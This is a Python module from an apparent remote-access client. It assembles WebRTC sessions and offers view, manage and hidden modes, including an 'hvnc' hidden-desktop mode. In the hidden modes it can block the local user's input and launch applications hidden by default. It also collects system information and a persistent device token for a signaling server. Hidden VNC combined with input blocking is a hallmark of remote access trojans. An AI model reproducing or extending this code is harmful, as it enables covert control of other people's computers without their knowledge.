"""Runtime helpers for building the remote client."""
from __future__ import annotations

import logging
import os
import uuid
from datetime import datetime, timezone
from typing import Any, Callable

from remote_client.config import resolve_signaling_url
from remote_client.control.cursor_visibility import CursorVisibilityController
from remote_client.control.handlers import ControlHandler, StabilizedControlHandler
from remote_client.control.input_controller import InputController, NullInputController
from remote_client.files.file_service import FileService
from remote_client.media.audio import AudioTrack
from remote_client.media.screen import ScreenTrack
from remote_client.security.e2ee import load_e2ee_context
from remote_client.webrtc.client import SessionResources, WebRTCClient
from remote_client.webrtc.signaling import create_signaling, create_signaling_from_url
from remote_client.windows.hidden_desktop import (
    HiddenDesktopSession,
    HiddenWindowSession,
    create_hidden_session,
)

logger = logging.getLogger(__name__)


def _is_dual_stream_enabled() -> bool:
    """Check if dual-stream mode is enabled for HVNC."""
    value = os.getenv("RC_HVNC_DUAL_STREAM", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def load_or_create_device_token() -> str | None:
    env_token = os.getenv("RC_DEVICE_TOKEN")
    if env_token:
        return env_token.strip()

    token_path = os.getenv("RC_DEVICE_TOKEN_PATH")
    if token_path:
        token_path = os.path.expanduser(token_path)
    else:
        token_path = os.path.join(os.path.expanduser("~"), ".remote_controller", "device_token")

    try:
        with open(token_path, "r", encoding="utf-8") as handle:
            stored = handle.read().strip()
            if stored:
                return stored
    except FileNotFoundError:
        pass
    except OSError:
        return None

    device_token = uuid.uuid4().hex
    try:
        token_dir = os.path.dirname(token_path)
        if token_dir:
            os.makedirs(token_dir, exist_ok=True)
        with open(token_path, "w", encoding="utf-8") as handle:
            handle.write(device_token)
    except OSError:
        return device_token
    return device_token


def _normalize_mode(mode: str | None) -> str:
    if not mode:
        return "manage"
    value = str(mode).strip().lower()
    if value in {"view", "viewer", "readonly"}:
        return "view"
    if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
        return "hidden"
    # HVNC mode - forces true hidden desktop via CreateDesktop API
    if value in {"hvnc", "hiddenvnc", "createdesktop"}:
        return "hvnc"
    if value in {"printwindow", "print_window", "print-window", "pw"}:
        return "printwindow"
    return "manage"


def _input_stabilizer_enabled() -> bool:
    value = os.getenv("RC_INPUT_STABILIZER", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _audio_enabled() -> bool:
    value = os.getenv("RC_DISABLE_AUDIO", "")
    return value.strip().lower() not in {"1", "true", "yes", "on"}


def _launch_hidden_enabled() -> bool:
    value = os.getenv("RC_LAUNCH_HIDDEN", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _build_control_handler(controller: InputController) -> ControlHandler:
    if _input_stabilizer_enabled():
        return StabilizedControlHandler(controller)
    return ControlHandler(controller)


def _compose_close(
    primary: Callable[[], None] | None,
    cursor_controller: CursorVisibilityController | None,
) -> Callable[[], None] | None:
    if not primary and not cursor_controller:
        return None

    def _close() -> None:
        if cursor_controller:
            cursor_controller.reset()
        if primary:
            primary()

    return _close


def build_session_resources(mode: str | None) -> SessionResources:
    normalized = _normalize_mode(mode)
    cursor_controller = CursorVisibilityController()
    if normalized == "view":
        controller = NullInputController()
        screen_track = ScreenTrack()
        control_handler = ControlHandler(controller)
        media_tracks: list[Any] = [screen_track]
        if _audio_enabled():
            media_tracks.append(AudioTrack())

        def _set_stream_profile(
            profile: str | None,
            width: int | None,
            height: int | None,
            fps: int | None,
        ) -> None:
            for track in media_tracks:
                if hasattr(track, "set_profile"):
                    track.set_profile(profile, width, height, fps)

        return SessionResources(
            control_handler,
            media_tracks,
            close=_compose_close(None, cursor_controller),
            set_stream_profile=_set_stream_profile,
            set_cursor_visibility=cursor_controller.set_visible,
        )
    if normalized in {"hidden", "printwindow", "hvnc"}:
        # Determine which mode to use
        if normalized == "printwindow":
            session_mode = "printwindow"
        elif normalized == "hvnc":
            session_mode = "hvnc"
        else:
            # Check environment variable for preferred hidden mode
            env_mode = os.getenv("RC_HIDDEN_MODE", "auto").strip().lower()
            if env_mode in {"hvnc", "hiddenvnc", "createdesktop"}:
                session_mode = "hvnc"
            elif env_mode in {"printwindow", "pw"}:
                session_mode = "printwindow"
            elif env_mode in {"virtual_display", "vd", "driver"}:
                session_mode = "virtual_display"
            elif env_mode in {"fallback", "legacy"}:
                session_mode = "fallback"
            else:
                session_mode = "auto"  # auto now tries hvnc first
        
        # Check if dual-stream mode is enabled for HVNC
        if session_mode == "hvnc" and _is_dual_stream_enabled():
            try:
                from remote_client.windows.hvnc_track import DualStreamSession
                dual_session = DualStreamSession()
                logger.info("Dual-stream HVNC session started (main + hvnc)")
                
                controller = dual_session.input_controller
                control_handler = _build_control_handler(controller)
                # Include both video tracks
                media_tracks: list[Any] = dual_session.video_tracks.copy()
                if _audio_enabled():
                    media_tracks.append(AudioTrack())
                
                def _set_stream_profile(
                    profile: str | None,
                    width: int | None,
                    height: int | None,
                    fps: int | None,
                ) -> None:
                    # Apply profile to both video tracks
                    for track in dual_session.video_tracks:
                        if hasattr(track, "set_profile"):
                            track.set_profile(profile, width, height, fps)
                
                def _set_input_blocking(enabled: bool) -> bool:
                    if enabled:
                        return dual_session.block_local_input()
                    else:
                        dual_session.unblock_local_input()
                        return True
                
                def _get_input_blocked() -> bool:
                    return getattr(dual_session, '_input_blocked', False)
                
                return SessionResources(
                    control_handler,
                    media_tracks,
                    close=dual_session.close,
                    launch_app=dual_session.launch_application,
                    set_stream_profile=_set_stream_profile,
                    set_input_blocking=_set_input_blocking,
                    get_input_blocked=_get_input_blocked,
                )
            except Exception as exc:
                logger.warning("Dual-stream session failed: %s, falling back to single-stream", exc)
        
        try:
            hidden_session = create_hidden_session(mode=session_mode)
            logger.info("Hidden session started in %s mode", hidden_session.mode)
        except Exception as exc:
            logger.warning("Hidden desktop session unavailable: %s", exc)
        else:
            controller = hidden_session.input_controller
            control_handler = _build_control_handler(controller)
            media_tracks: list[Any] = [hidden_session.screen_track]
            if _audio_enabled():
                media_tracks.append(AudioTrack())

            def _set_stream_profile(
                profile: str | None,
                width: int | None,
                height: int | None,
                fps: int | None,
            ) -> None:
                hidden_session.screen_track.set_profile(profile, width, height, fps)
            
            # Input blocking support for hidden/hvnc modes
            def _set_input_blocking(enabled: bool) -> bool:
                if enabled:
                    return hidden_session.block_local_input()
                else:
                    hidden_session.unblock_local_input()
                    return True
            
            def _get_input_blocked() -> bool:
                return getattr(hidden_session, '_input_blocked', False)

            return SessionResources(
                control_handler,
                media_tracks,
                close=hidden_session.close,
                launch_app=hidden_session.launch_application,
                set_stream_profile=_set_stream_profile,
                set_input_blocking=_set_input_blocking,
                get_input_blocked=_get_input_blocked,
            )

    controller = InputController()
    screen_track = ScreenTrack(draw_cursor=False)
    control_handler = _build_control_handler(controller)
    media_tracks: list[Any] = [screen_track]
    if _audio_enabled():
        media_tracks.append(AudioTrack())

    def _launch_app(app_name: str) -> None:
        try:
            from remote_client.apps.launcher import launch_app as _launch_app  # local import for PyInstaller
        except Exception as exc:
            logger.warning("App launcher unavailable: %s", exc)
            raise RuntimeError("App launcher unavailable.")
        _launch_app(app_name, hidden=_launch_hidden_enabled())

    def _set_stream_profile(
        profile: str | None,
        width: int | None,
        height: int | None,
        fps: int | None,
    ) -> None:
        for track in media_tracks:
            if hasattr(track, "set_profile"):
                track.set_profile(profile, width, height, fps)

    return SessionResources(
        control_handler,
        media_tracks,
        close=_compose_close(None, cursor_controller),
        launch_app=_launch_app,
        set_stream_profile=_set_stream_profile,
        set_cursor_visibility=cursor_controller.set_visible,
    )


def build_client(
    session_id: str,
    token: str | None,
    device_token: str | None,
    team_id: str | None = None,
    client_config: dict | None = None,
) -> WebRTCClient:
    if client_config is None:
        client_config = {}
    if isinstance(client_config, dict):
        system_info: dict[str, object] = {}
        disabled = os.getenv("RC_DISABLE_SYSTEM_INFO", "").strip().lower() in {
            "1",
            "true",
            "yes",
            "on",
        }
        if not disabled:
            try:
                from remote_client.system_info import (
                    collect_system_info,
                    load_or_collect_system_info,
                )

                system_info = collect_system_info()
                if not system_info:
                    system_info = load_or_collect_system_info()
            except Exception as exc:
                logger.debug("System info collection failed: %s", exc)
                system_info = {}
        if system_info:
            system_info["system_info_updated_at"] = datetime.now(timezone.utc).isoformat()
            merged = dict(client_config)
            merged.update(system_info)
            client_config = merged
    signaling_url = resolve_signaling_url()
    if signaling_url:
        if "://" in signaling_url:
            signaling = create_signaling_from_url(signaling_url, session_id, token)
        else:
            host, _, port = signaling_url.partition(":")
            signaling = create_signaling(
                host,
                int(port) if port else int(os.getenv("RC_SIGNALING_PORT", "8000")),
                session_id,
                token,
            )
    else:
        signaling_host = os.getenv("RC_SIGNALING_HOST", "localhost")
        signaling_port = int(os.getenv("RC_SIGNALING_PORT", "8000"))
        signaling = create_signaling(signaling_host, signaling_port, session_id, token)

    file_service = FileService()
    e2ee_context = load_e2ee_context(session_id)
    return WebRTCClient(
        session_id=session_id,
        signaling=signaling,
        session_factory=build_session_resources,
        file_service=file_service,
        device_token=device_token,
        team_id=team_id,
        client_config=client_config,
        e2ee=e2ee_context,
    )
